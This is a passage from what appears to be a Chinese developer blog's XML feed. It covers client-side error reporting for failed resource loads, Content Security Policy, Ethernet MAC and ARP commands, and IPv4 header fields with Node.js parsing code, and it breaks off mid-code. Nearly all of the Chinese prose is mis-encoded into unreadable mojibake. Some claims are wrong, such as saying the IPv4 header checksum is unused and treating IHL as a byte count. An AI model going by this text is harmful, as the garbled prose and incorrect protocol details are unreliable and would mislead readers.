setInterval</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame">requestAnimationFrame</a></li><li><a href="https://dev.opera.com/articles/better-performance-with-requestanimationframe/">Better Performance With requestAnimationFrame</a></li><li><a href="https://stackoverflow.com/a/16033979/4942848">How do browsers pause&#x2F;change Javascript when tab or window is not active?</a></li><li><a href="https://css-tricks.com/using-requestanimationframe/">Using requestAnimationFrame</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é¡µé¢æŸåèµ„æºåŠ¨æ€æ„ŸçŸ¥</title>
      <link href="/post/bad-resource-dynamic-perception.html"/>
      <url>/post/bad-resource-dynamic-perception.html</url>
      
        <content type="html"><![CDATA[<h2 id="é¡µé¢æŸåèµ„æºåŠ¨æ€æ„ŸçŸ¥"><a href="#é¡µé¢æŸåèµ„æºåŠ¨æ€æ„ŸçŸ¥" class="headerlink" title="é¡µé¢æŸåèµ„æºåŠ¨æ€æ„ŸçŸ¥"></a>é¡µé¢æŸåèµ„æºåŠ¨æ€æ„ŸçŸ¥</h2><p>ç½‘é¡µä¸­ä¼šå­˜åœ¨æŸäº›èµ„æºåŠ è½½å¤±è´¥çš„æƒ…å†µï¼Œå¦‚404ã€‚å¦‚æœè¯·æ±‚çš„æ˜¯æˆ‘ä»¬è‡ªå·±çš„èµ„æºæœåŠ¡å™¨ï¼Œå½“èµ„æºä¸å­˜åœ¨æ—¶æœåŠ¡å™¨ç«¯å°±èƒ½è®°å½•åˆ°ã€‚ä½†å¦‚èµ„æºä¸åœ¨æˆ‘ä»¬æœåŠ¡å™¨æˆ–è€…èµ„æºåœ¨å“åº”è¿‡ç¨‹ä¸­è¢«æˆªæ–­ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸‹é¢æ–¹æ³•åœ¨å®¢æˆ·ç«¯æ•è·åˆ°åŠ è½½å¤±è´¥çš„èµ„æºç„¶åä¸ŠæŠ¥ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> target = e.<span class="property">target</span>;</span><br><span class="line">    <span class="keyword">if</span> (target.<span class="property">tagName</span> === <span class="string">&#x27;IMG&#x27;</span> &amp;&amp; -<span class="number">1</span> !== target.<span class="property">src</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;bad-resource.example.com/report&#x27;</span>)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸ŠæŠ¥</span></span><br><span class="line">    <span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    img.<span class="property">src</span> = <span class="string">&#x27;http://bad-resource.example.com/report?tag=&#x27;</span> + target.<span class="property">tagName</span> + <span class="string">&#x27;&amp;href=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(target.<span class="property">src</span> || target.<span class="property">href</span>);</span><br><span class="line">    img.<span class="property">width</span> = <span class="number">0</span>;</span><br><span class="line">    img.<span class="property">height</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(img);</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>é™¤äº†æ•è·åŠ è½½å¤±è´¥çš„èµ„æºï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ•è·é¡µé¢åŠ è½½äº†å“ªäº›èµ„æºã€‚ä¾‹å¦‚æ£€æŸ¥é¡µé¢æœ‰æ²¡æœ‰è¢«æ³¨å…¥è„šæœ¬ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;document-load: &#x27;</span>, e.<span class="property">target</span>.<span class="property">tagName</span>, e.<span class="property">target</span>.<span class="property">src</span> || e.<span class="property">target</span>.<span class="property">href</span>);</span><br><span class="line">&#125;, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><blockquote><p>å¯¹äºé¡µé¢è¢«æ³¨å…¥æ¶æ„è„šæœ¬è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬ä½¿ç”¨<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">Content Security Policy</a>æ·»åŠ èµ„æºåŠ è½½ç™½åå•æ›´æ–¹ä¾¿ã€‚ä¸‹å›¾ä¸ºå¾®ä¿¡ä½¿ç”¨çš„å†…å®¹å®‰å…¨ç­–ç•¥ï¼š<br><img src="/images/wechat-content-security-policy.png" alt="å¾®ä¿¡ Content Security Policy"></p></blockquote><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener">EventTarget.addEventListener()</a></li><li><a href="https://stackoverflow.com/a/38517365/4942848">window.onload vs document.onload</a></li><li><a href="http://hax.iteye.com/blog/162718">addEventListenerçš„ç¬¬ä¸‰å€‹åƒæ•¸</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">å†…å®¹å®‰å…¨ç­–ç•¥( CSP )</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> addEventListener </tag>
            
            <tag> useCapture </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MACåè®®</title>
      <link href="/post/mac-protocol.html"/>
      <url>/post/mac-protocol.html</url>
      
        <content type="html"><![CDATA[<h2 id="MACåè®®"><a href="#MACåè®®" class="headerlink" title="MACåè®®"></a>MACåè®®</h2><p><img src="/images/ip-mac.png"></p><ul><li>MAC å¤´éƒ¨ï¼ˆç”¨äºä»¥å¤ªç½‘åè®®ï¼‰</li><li>IP å¤´éƒ¨ï¼ˆç”¨äº IP åè®®ï¼‰</li></ul><p>é¦–å…ˆï¼Œå‘é€æ–¹å°†åŒ…çš„ç›®çš„åœ°ï¼Œä¹Ÿå°±æ˜¯è¦è®¿é—®çš„æœåŠ¡å™¨çš„ IP åœ°å€å†™å…¥ IP å¤´éƒ¨ä¸­ã€‚è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±çŸ¥é“è¿™ä¸ªåŒ…åº”è¯¥å‘å¾€å“ªé‡Œï¼ŒIP åè®®å°±å¯ä»¥æ ¹æ®è¿™ä¸€åœ°å€æŸ¥æ‰¾åŒ…çš„ä¼ è¾“æ–¹å‘ï¼Œä»è€Œæ‰¾åˆ°ä¸‹ä¸€ä¸ªè·¯ç”±å™¨çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯å›¾ä¸­çš„è·¯ç”±å™¨ R1ã€‚æ¥ä¸‹æ¥ï¼ŒIP åè®®ä¼š<strong>å§”æ‰˜</strong>ä»¥å¤ªç½‘åè®®å°†åŒ…ä¼ è¾“è¿‡å»ã€‚è¿™æ—¶ï¼ŒIP åè®®ä¼šæŸ¥æ‰¾ä¸‹ä¸€ä¸ªè·¯ç”±å™¨çš„ä»¥å¤ªç½‘åœ°å€ï¼ˆMAC åœ°å€ï¼‰ï¼Œå¹¶å°†è¿™ä¸ªåœ°å€å†™å…¥ MAC å¤´éƒ¨ä¸­ã€‚è¿™æ ·ä¸€æ¥ï¼Œä»¥å¤ªç½‘åè®®å°±çŸ¥é“è¦å°†è¿™ä¸ªåŒ…å‘åˆ°å“ªä¸€ä¸ªè·¯ç”±å™¨ä¸Šäº†ã€‚è·¯ç”±å™¨ä¸­æœ‰ä¸€å¼  IP åè®®çš„è¡¨ï¼Œå¯æ ¹æ®è¿™å¼ è¡¨ä»¥åŠ IP å¤´éƒ¨ä¸­è®°å½•çš„ç›®çš„åœ°ä¿¡æ¯æŸ¥å‡ºæ¥ä¸‹æ¥åº”è¯¥å‘å¾€å“ªä¸ªè·¯ç”±å™¨ã€‚ä¸ºäº†å°†åŒ…å‘åˆ°ä¸‹ä¸€ä¸ªè·¯ç”±å™¨ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æŸ¥å‡ºä¸‹ä¸€ä¸ªè·¯ç”±å™¨çš„ MAC åœ°å€ï¼Œå¹¶è®°å½•åˆ° MAC å¤´éƒ¨ä¸­ï¼Œå¤§å®¶å¯ä»¥ç†è§£ä¸ºæ”¹å†™äº† MAC å¤´éƒ¨ã€‚è¿™æ ·ï¼Œç½‘ç»œåŒ…å°±åˆè¢«å‘å¾€ä¸‹ä¸€ä¸ªèŠ‚ç‚¹äº†ã€‚</p><h3 id="MACï¼ˆMedium-Access-Controlï¼‰åè®®"><a href="#MACï¼ˆMedium-Access-Controlï¼‰åè®®" class="headerlink" title="MACï¼ˆMedium Access Controlï¼‰åè®®"></a>MACï¼ˆMedium Access Controlï¼‰åè®®</h3><p>MAC åœ°å€æ˜¯åœ¨ç½‘å¡ç”Ÿäº§æ—¶å†™å…¥ ROM é‡Œçš„ï¼Œåªè¦å°†è¿™ä¸ªå€¼è¯»å–å‡ºæ¥å†™å…¥ MAC å¤´éƒ¨å°±å¯ä»¥äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|          Destination          |</span><br><span class="line">+-                             -+</span><br><span class="line">|            Ethernet           |</span><br><span class="line">+-                             -+</span><br><span class="line">|            Address            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|             Source            |</span><br><span class="line">+-                             -+</span><br><span class="line">|            Ethernet           |</span><br><span class="line">+-                             -+</span><br><span class="line">|            Address            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Ethernet Type         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|             IPv6              |</span><br><span class="line">+-                             -+</span><br><span class="line">|            header             |</span><br><span class="line">+-                             -+</span><br><span class="line">|             and               |</span><br><span class="line">+-                             -+</span><br><span class="line">/            payload ...        /</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><ul><li><p>Destination Ethernet Address: 48 bits</p><p>  æ¥æ”¶æ–¹ MAC åœ°å€</p></li><li><p>Source Ethernet Address: 48 bits</p><p>  å‘é€æ–¹ MAC åœ°å€</p></li><li><p>Ethernet Type: 16 bits</p><p>  ä»¥å¤ªç½‘ç±»å‹ã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„ç±»å‹ï¼Œä¸€èˆ¬åœ¨ TCP&#x2F;IP é€šä¿¡ä¸­åªä½¿ç”¨ 0800 å’Œ 0806 è¿™ä¸¤ç§ã€‚</p><ul><li>0000-05DCï¼šIEEE 802.3</li><li>0800ã€€ã€€ã€€ï¼šIP åè®®</li><li>0806ã€€ã€€ã€€ï¼šARP åè®®</li><li>86DD ã€€  ï¼šã€€IPv6</li></ul></li></ul><figure class="highlight js"><figcaption><span>parse_mac.js</span><a href="/downloads/code/parse_mac.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseMAC</span>(<span class="params">mac</span>) {</span><br><span class="line">    <span class="keyword">let</span> _readerIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> srcMac = [], dstMac = [], type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> pos = <span class="number">0</span>; pos &lt; <span class="number">6</span>; pos ++) dstMac.<span class="title function_">push</span>(mac.<span class="title function_">readUInt8</span>(_readerIndex++));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> pos = <span class="number">0</span>; pos &lt; <span class="number">6</span>; pos ++) srcMac.<span class="title function_">push</span>(mac.<span class="title function_">readUInt8</span>(_readerIndex++));</span><br><span class="line"></span><br><span class="line">    type = mac.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        <span class="attr">srcMac</span>: srcMac.<span class="title function_">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="title function_">toString</span>(<span class="number">16</span>)).<span class="title function_">join</span>(<span class="string">&#x27;:&#x27;</span>),</span><br><span class="line">        <span class="attr">dstMac</span>: dstMac.<span class="title function_">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="title function_">toString</span>(<span class="number">16</span>)).<span class="title function_">join</span>(<span class="string">&#x27;:&#x27;</span>),</span><br><span class="line">        <span class="attr">type</span>: type.<span class="title function_">toString</span>(<span class="number">16</span>)</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">parseMAC</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;01005e7ffffa507b9d0bd1f40800&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>)));</span><br></pre></td></tr></table></figure><h3 id="ARPï¼ˆAddress-Resolution-Protocolï¼‰"><a href="#ARPï¼ˆAddress-Resolution-Protocolï¼‰" class="headerlink" title="ARPï¼ˆAddress Resolution Protocolï¼‰"></a>ARPï¼ˆAddress Resolution Protocolï¼‰</h3><p><img src="/images/arp.png"></p><ul><li><p>æŸ¥çœ‹æ‰€æœ‰ç¼“å­˜</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arp -a</span> </span><br><span class="line">bogon (10.0.1.1) at c:51:1:e2:ab:64 on en0 ifscope [ethernet]</span><br><span class="line">bogon (10.0.1.5) at 68:ef:43:2c:7b:7e on en0 ifscope [ethernet]</span><br><span class="line">bogon (10.0.1.15) at 70:1c:e7:47:ef:50 on en0 ifscope [ethernet]</span><br><span class="line">localhost (10.0.1.255) at ff:ff:ff:ff:ff:ff on en0 ifscope [ethernet]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥è¯¢æŒ‡å®šç½‘ç»œæ¥å£çš„ç¼“å­˜</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arp -i en0 -a</span></span><br><span class="line">bogon (10.0.1.1) at c:51:1:e2:ab:64 on en0 ifscope [ethernet]</span><br><span class="line">bogon (10.0.1.15) at 70:1c:e7:47:ef:50 on en0 ifscope [ethernet]</span><br><span class="line">localhost (10.0.1.255) at ff:ff:ff:ff:ff:ff on en0 ifscope [ethernet]</span><br><span class="line">? (224.0.0.251) at 1:0:5e:0:0:fb on en0 ifscope permanent [ethernet]</span><br><span class="line">? (239.255.255.250) at 1:0:5e:7f:ff:fa on en0 ifscope permanent [ethernet]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥è¯¢æŒ‡å®šä¸»æœºçš„arpæ¡ç›®</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arp -a 172.16.0.108</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤æŒ‡å®šä¸»æœºçš„arpæ¡ç›®</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> arp -d 10.0.1.8</span></span><br><span class="line">10.0.1.8 (10.0.1.8) deleted</span><br></pre></td></tr></table></figure></li><li><p>è®¾ç½®æŒ‡å®šä¸»æœºä¸MACåœ°å€çš„æ˜ å°„</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arp -s 172.16.0.108 00:50:56:82:52:2c</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://tools.ietf.org/html/rfc793#section-3.1">TRANSMISSION CONTROL PROTOCOL</a></li><li><a href="https://book.douban.com/subject/26941639/">ç½‘ç»œæ˜¯æ€ä¹ˆè¿æ¥çš„</a></li><li><a href="https://book.douban.com/subject/1088054/">TCP&#x2F;IPè¯¦è§£ å·1ï¼šåè®®</a></li><li><a href="https://book.douban.com/subject/1683696/">TCP&#x2F;IPç½‘ç»œä¸åè®®ï¼ˆç¬¬äºŒç‰ˆï¼‰</a></li><li><a href="https://www.zhihu.com/question/21524257">ä¸ºä»€ä¹ˆæ ‡å‡†ä»¥å¤ªç½‘æ¥å£ç¼ºçœçš„MTUä¸º1500ï¼Ÿ</a></li><li><a href="https://community.emc.com/message/842879#842879">ç»†è¯´TCPç¡®è®¤æœºåˆ¶</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> tcp </tag>
            
            <tag> ip </tag>
            
            <tag> mac </tag>
            
            <tag> arp </tag>
            
            <tag> icmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPåè®®</title>
      <link href="/post/ip-protocol.html"/>
      <url>/post/ip-protocol.html</url>
      
        <content type="html"><![CDATA[<h2 id="IPåè®®"><a href="#IPåè®®" class="headerlink" title="IPåè®®"></a>IPåè®®</h2><blockquote><p>IP å…¨ç§° INTERNET PROTOCOL</p></blockquote><p><img src="/images/tcp-ip-mac.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                       Source Address                          |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Destination Address                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Options                    |    Padding    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><ul><li><p>Version:  4 bits</p><p>  ç‰ˆæœ¬å·ï¼Œç›®å‰ä½¿ç”¨çš„æ˜¯4ã€‚</p></li><li><p>IHL:  4 bits</p><p>  IP å¤´éƒ¨çš„é•¿åº¦ã€‚å¯é€‰å­—æ®µå¯å¯¼è‡´å¤´éƒ¨é•¿åº¦å˜åŒ–ï¼Œå› æ­¤è¿™é‡Œéœ€è¦æŒ‡å®šå¤´éƒ¨çš„é•¿åº¦ã€‚ä¸æ˜¯å­—èŠ‚æ•°ï¼Œæ˜¯32ä½çš„ä¸ªæ•°ã€‚å¤´é•¿åº¦ä¸º<code>IHL * 32 bits or IHL * 4 bytes</code>ã€‚</p></li><li><p>Type of Service:  8 bits</p><p>  è¡¨ç¤ºåŒ…ä¼ è¾“ä¼˜å…ˆçº§ã€‚</p></li><li><p>Total Length:  16 bits</p><p>  è¡¨ç¤º IP æ¶ˆæ¯çš„æ€»é•¿åº¦ï¼ˆæœ€å¤§65535 bytesï¼‰ã€‚TCPåŒ…çš„å¤§å°å°±æ˜¯ï¼ˆTotal Length - IHLï¼‰ã€‚</p></li><li><p>Identification:  16 bits</p><p>  ç”¨äºè¯†åˆ«åŒ…çš„ç¼–å·ï¼Œä¸€èˆ¬ä¸ºåŒ…çš„åºåˆ—å·ã€‚å¦‚æœä¸€ä¸ªåŒ…è¢« IP åˆ†ç‰‡ï¼Œåˆ™æ‰€æœ‰åˆ†ç‰‡éƒ½æ‹¥æœ‰ç›¸åŒçš„ IDã€‚</p></li><li><p>Flags:  3 bits</p><p>  è¯¥å­—æ®µæœ‰ 3 ä¸ªæ¯”ç‰¹ï¼Œå…¶ä¸­ 2 ä¸ªæ¯”ç‰¹æœ‰æ•ˆï¼Œåˆ†åˆ«ä»£è¡¨æ˜¯å¦å…è®¸åˆ†ç‰‡ï¼Œä»¥åŠå½“å‰åŒ…æ˜¯å¦ä¸ºåˆ†ç‰‡åŒ…ã€‚</p></li><li><p>Fragment Offset:  13 bits</p><p>  è¡¨ç¤ºå½“å‰åŒ…çš„å†…å®¹ä¸ºæ•´ä¸ª IP æ¶ˆæ¯çš„ç¬¬å‡ ä¸ªå­—èŠ‚å¼€å§‹çš„å†…å®¹ã€‚</p></li><li><p>Time to Live:  8 bits</p><p>  è¡¨ç¤ºåŒ…çš„ç”Ÿå­˜æ—¶é—´ï¼Œè¿™æ˜¯ä¸ºäº†é¿å…ç½‘ç»œå‡ºç°å›ç¯æ—¶ä¸€ä¸ªåŒ…æ°¸è¿œåœ¨ç½‘ç»œä¸­æ‰“è½¬ã€‚æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼Œè¿™ä¸ªå€¼å°±ä¼šå‡ 1ï¼Œå‡åˆ° 0 æ—¶è¿™ä¸ªåŒ…å°±ä¼šè¢«ä¸¢å¼ƒã€‚ä¸€èˆ¬ä¼šè®¾ç½®ä¸º<em>64</em>æˆ–è€…128ã€‚</p></li><li><p>Protocol:  8 bits</p><p>  åè®®å·è¡¨ç¤ºåè®®çš„ç±»å‹ï¼ˆä»¥ä¸‹å‡ä¸ºåå…­è¿›åˆ¶ï¼‰</p><ul><li>TCP: 06</li><li>UDP: 11</li><li>ICMP: 01</li></ul></li><li><p>Header Checksum:  16 bits</p><p>  ç”¨äºæ£€æŸ¥é”™è¯¯ï¼Œç°åœ¨å·²ä¸ä½¿ç”¨ã€‚</p></li><li><p>Source Address:  32 bits</p><p>  ç½‘ç»œåŒ…å‘é€æ–¹çš„ IP åœ°å€ã€‚ TODO æ ¹æ®è·¯ç”±è¡¨æŸ¥è¯¢</p></li><li><p>Destination Address:  32 bits</p><p>  ç½‘ç»œåŒ…æ¥æ”¶æ–¹çš„ IP åœ°å€ã€‚</p></li><li><p>Options:  variable</p><p>  é™¤äº†ä¸Šé¢çš„å¤´éƒ¨å­—æ®µä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ·»åŠ å¯é€‰å­—æ®µç”¨äºè®°å½•å…¶ä»–æ§åˆ¶ä¿¡æ¯ï¼Œä½†å¯é€‰å­—æ®µå¾ˆå°‘ä½¿ç”¨ã€‚</p></li></ul><figure class="highlight js"><figcaption><span>parse_ip.js</span><a href="/downloads/code/parse_ip.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseIP</span>(<span class="params">ip</span>) {</span><br><span class="line">    <span class="keyword">let</span> _readerIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> version, ihl, type, len, id, flags, offset, ttl, protocol, checksum, source = [], dest = [], options;</span><br><span class="line"></span><br><span class="line">    version = ip.<span class="title function_">readUInt8</span>(_readerIndex) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    ihl = ip.<span class="title function_">readUInt8</span>(_readerIndex) &amp; <span class="number">0x0f</span>;</span><br><span class="line">    _readerIndex++;</span><br><span class="line"></span><br><span class="line">    type = ip.<span class="title function_">readUInt8</span>(_readerIndex);</span><br><span class="line">    _readerIndex++;</span><br><span class="line"></span><br><span class="line">    len = ip.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    id = ip.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    flags = ip.<span class="title function_">readUInt16BE</span>(_readerIndex) &gt;&gt; <span class="number">13</span>;</span><br><span class="line">    offset = ip.<span class="title function_">readUInt16BE</span>(_readerIndex) &amp; <span class="number">0x1fff</span>;</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    ttl = ip.<span class="title function_">readUInt8</span>(_readerIndex);</span><br><span class="line">    _readerIndex++;</span><br><span class="line"></span><br><span class="line">    protocol = ip.<span class="title function_">readUInt8</span>(_readerIndex);</span><br><span class="line">    _readerIndex++;</span><br><span class="line"></span><br><span class="line">    checksum = ip.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> p = <span class="number">0</span>; p &lt; <span class="number">4</span>; p++) source[p] = ip.<span class="title function_">readUInt8</span>(_readerIndex++);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> p = <span class="number">0</span>; p &lt; <span class="number">4</span>; p++) dest[p] = ip.<span class="title function_">readUInt8</span>(_readerIndex++);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_readerIndex &lt; ihl * <span class="number">4</span>) options = ip.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>, _readerIndex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        version, ihl, type, len, id, flags, offset, ttl, protocol, checksum, source, dest, options</span><br><span class="line">    };</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable 